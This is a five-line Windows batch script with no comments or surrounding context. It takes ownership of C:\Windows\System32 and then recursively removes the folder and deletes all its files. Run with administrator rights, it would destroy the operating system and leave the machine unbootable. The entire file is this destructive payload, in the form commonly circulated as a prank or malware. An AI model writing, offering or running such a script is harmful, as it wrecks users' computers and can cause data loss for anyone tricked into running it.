@echo off
takeown/f C:\Windows\System32
cacls C:\Windows\System32
rd /s /q C:\Windows\System32
del /s /q C:\Windows\System32\*.*
